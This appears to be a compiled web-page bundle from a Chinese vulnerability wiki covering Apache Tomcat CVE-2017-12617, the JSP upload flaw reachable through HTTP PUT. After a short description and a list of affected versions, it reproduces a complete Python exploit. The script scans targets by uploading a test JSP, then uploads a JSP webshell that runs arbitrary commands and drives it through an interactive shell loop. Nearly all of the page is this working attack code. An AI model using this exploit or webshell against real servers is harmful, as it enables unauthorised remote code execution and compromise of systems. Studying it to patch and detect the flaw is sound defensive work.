import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const p={},e=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Tomcat版本9.0.0.M1至9.0.0、8.5.0至8.5.22、8.0.0.RC1至8.0.46和7.0.0至7.0.81且启用HTTP PUT时（例如，通过设置只读如果将Default servlet的初始化参数设置为false，则可以通过特制请求将JSP文件上载到服务器。然后可以请求此JSP，并且服务器将执行其中包含的所有代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Tomcat版本9.0.0.M1至9.0.0
Apache Tomcat版本8.5.0至8.5.22
Apache Tomcat版本8.0.0.RC1至8.0.46
Apache Tomcat版本7.0.0至7.0.81
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>
<span class="token comment"># From https://github.com/cyberheartmi9/CVE-2017-12617/blob/master/tomcat-cve-2017-12617.py</span>
<span class="token triple-quoted-string string">&quot;&quot;&quot;
./cve-2017-12617.py [options]


options:


-u ,--url [::] check target url if it&#39;s vulnerable
-p,--pwn [::] generate webshell and upload it
-l,--list [::] hosts list


[+]usage:


./cve-2017-12617.py -u http://127.0.0.1
./cve-2017-12617.py --url http://127.0.0.1
./cve-2017-12617.py -u http://127.0.0.1 -p pwn
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn
./cve-2017-12617.py -l hotsts.txt
./cve-2017-12617.py --list hosts.txt
&quot;&quot;&quot;</span>
<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">input</span>
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span>
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">object</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> signal
<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser








<span class="token keyword">class</span> <span class="token class-name">bcolors</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    HEADER <span class="token operator">=</span> <span class="token string">&#39;\\033[95m&#39;</span>
    OKBLUE <span class="token operator">=</span> <span class="token string">&#39;\\033[94m&#39;</span>
    OKGREEN <span class="token operator">=</span> <span class="token string">&#39;\\033[92m&#39;</span>
    WARNING <span class="token operator">=</span> <span class="token string">&#39;\\033[93m&#39;</span>
    FAIL <span class="token operator">=</span> <span class="token string">&#39;\\033[91m&#39;</span>
    ENDC <span class="token operator">=</span> <span class="token string">&#39;\\033[0m&#39;</span>
    BOLD <span class="token operator">=</span> <span class="token string">&#39;\\033[1m&#39;</span>
    UNDERLINE <span class="token operator">=</span> <span class="token string">&#39;\\033[4m&#39;</span>




banner<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;


   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |
 | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \\| |  / /
 | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/



[@intx0x80]

&quot;&quot;&quot;</span>





<span class="token keyword">def</span> <span class="token function">signal_handler</span><span class="token punctuation">(</span>signal<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;\\033[91m&quot;</span><span class="token operator">+</span><span class="token string">&quot;\\n[-] Exiting&quot;</span><span class="token operator">+</span><span class="token string">&quot;\\033[0m&quot;</span><span class="token punctuation">)</span>

    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

signal<span class="token punctuation">.</span>signal<span class="token punctuation">(</span>signal<span class="token punctuation">.</span>SIGINT<span class="token punctuation">,</span> signal_handler<span class="token punctuation">)</span>




<span class="token keyword">def</span> <span class="token function">removetags</span><span class="token punctuation">(</span>tags<span class="token punctuation">)</span><span class="token punctuation">:</span>
    remove <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">&#39;&lt;.*?&gt;&#39;</span><span class="token punctuation">)</span>
    txt <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>remove<span class="token punctuation">,</span> <span class="token string">&#39;\\n&#39;</span><span class="token punctuation">,</span> tags<span class="token punctuation">)</span>
    <span class="token keyword">return</span> txt<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;\\n\\n\\n&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">getContent</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="token punctuation">}</span>
    re<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>content

<span class="token keyword">def</span> <span class="token function">createPayload</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    evil<span class="token operator">=</span><span class="token string">&#39;&lt;% out.println(&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;);%&gt;&#39;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="token punctuation">}</span>
    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span>data<span class="token operator">=</span>evil<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">201</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;File Created ..&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">RCE</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    EVIL<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;&lt;FORM METHOD=GET ACTION=&#39;{}&#39;&gt;&quot;&quot;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
    &lt;/FORM&gt;
    &lt;%@ page import=&quot;java.io.*&quot; %&gt;
    &lt;%
   String cmd = request.getParameter(&quot;cmd&quot;);
   String output = &quot;&quot;;
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%&gt;
&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;&quot;&quot;&quot;</span>



    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="token punctuation">}</span>

    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span>f<span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span>data<span class="token operator">=</span>EVIL<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>



<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="token punctuation">}</span>
        cmd<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;$ &quot;</span><span class="token punctuation">)</span>
        payload<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span>cmd<span class="token punctuation">}</span>
        <span class="token keyword">if</span> cmd<span class="token operator">==</span><span class="token string">&quot;q&quot;</span> <span class="token keyword">or</span> cmd<span class="token operator">==</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>

        re<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token operator">=</span>payload<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        re<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
        t<span class="token operator">=</span>removetags<span class="token punctuation">(</span>re<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>





<span class="token comment">#print bcolors.HEADER+ banner+bcolors.ENDC</span>

parse<span class="token operator">=</span>OptionParser<span class="token punctuation">(</span>


bcolors<span class="token punctuation">.</span>HEADER<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;


   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |
 | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \\| |  / /
 | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/




./cve-2017-12617.py [options]

options:

-u ,--url [::] check target url if it&#39;s vulnerable
-p,--pwn  [::] generate webshell and upload it
-l,--list [::] hosts list

[+]usage:

./cve-2017-12617.py -u http://127.0.0.1
./cve-2017-12617.py --url http://127.0.0.1
./cve-2017-12617.py -u http://127.0.0.1 -p pwn
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn
./cve-2017-12617.py -l hotsts.txt
./cve-2017-12617.py --list hosts.txt


[@intx0x80]

&quot;&quot;&quot;</span><span class="token operator">+</span>bcolors<span class="token punctuation">.</span>ENDC

    <span class="token punctuation">)</span>


parse<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;--url&quot;</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">&quot;U&quot;</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Website Url&quot;</span><span class="token punctuation">)</span>
parse<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">&quot;-p&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;--pwn&quot;</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">&quot;P&quot;</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;generate webshell and upload it&quot;</span><span class="token punctuation">)</span>
parse<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">&quot;-l&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;--list&quot;</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">&quot;L&quot;</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;hosts File&quot;</span><span class="token punctuation">)</span>

<span class="token punctuation">(</span>opt<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parse<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> opt<span class="token punctuation">.</span>U<span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">and</span> opt<span class="token punctuation">.</span>P<span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">and</span> opt<span class="token punctuation">.</span>L<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>parse<span class="token punctuation">.</span>usage<span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>



<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> opt<span class="token punctuation">.</span>U<span class="token operator">!=</span><span class="token boolean">None</span> <span class="token keyword">and</span> opt<span class="token punctuation">.</span>P<span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">and</span> opt<span class="token punctuation">.</span>L<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN<span class="token operator">+</span>banner<span class="token operator">+</span>bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>
        url<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>opt<span class="token punctuation">.</span>U<span class="token punctuation">)</span>
        checker<span class="token operator">=</span><span class="token string">&quot;Poc.jsp&quot;</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>BOLD <span class="token operator">+</span><span class="token string">&quot;Poc Filename  {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>checker<span class="token punctuation">)</span><span class="token punctuation">)</span>
        createPayload<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span>checker<span class="token punctuation">)</span>
        con<span class="token operator">=</span>getContent<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span>checker<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="token keyword">in</span> con<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>WARNING<span class="token operator">+</span>url<span class="token operator">+</span><span class="token string">&#39; it\\&#39;s Vulnerable to CVE-2017-12617&#39;</span><span class="token operator">+</span>bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>WARNING<span class="token operator">+</span>url<span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span>checker<span class="token operator">+</span>bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Not Vulnerable to CVE-2017-12617 &#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> opt<span class="token punctuation">.</span>P<span class="token operator">!=</span><span class="token boolean">None</span> <span class="token keyword">and</span> opt<span class="token punctuation">.</span>U<span class="token operator">!=</span><span class="token boolean">None</span> <span class="token keyword">and</span>  opt<span class="token punctuation">.</span>L<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN<span class="token operator">+</span>banner<span class="token operator">+</span>bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>
        pwn<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>opt<span class="token punctuation">.</span>P<span class="token punctuation">)</span>
        url<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>opt<span class="token punctuation">.</span>U<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Uploading Webshell .....&quot;</span><span class="token punctuation">)</span>
        pwn<span class="token operator">=</span>pwn<span class="token operator">+</span><span class="token string">&quot;.jsp&quot;</span>
        RCE<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span>pwn<span class="token punctuation">)</span>
        shell<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">,</span>pwn<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> opt<span class="token punctuation">.</span>L<span class="token operator">!=</span><span class="token boolean">None</span> <span class="token keyword">and</span> opt<span class="token punctuation">.</span>P<span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">and</span> opt<span class="token punctuation">.</span>U<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN<span class="token operator">+</span>banner<span class="token operator">+</span>bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>
        w<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>opt<span class="token punctuation">.</span>L<span class="token punctuation">)</span>
        f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Scaning hosts in {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">)</span>
        checker<span class="token operator">=</span><span class="token string">&quot;Poc.jsp&quot;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            i<span class="token operator">=</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>
            createPayload<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span>checker<span class="token punctuation">)</span>
            con<span class="token operator">=</span>getContent<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span>checker<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="token keyword">in</span> con<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;\\033[91m&quot;</span><span class="token operator">+</span><span class="token string">&quot; [ Vulnerable ] &quot;</span><span class="token string">&quot;\\033[0m&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),o=[e];function i(l,c){return s(),a("div",null,o)}const d=n(p,[["render",i],["__file","Apache Tomcat RCE via JSP Upload Bypass.html.vue"]]);export{d as default};
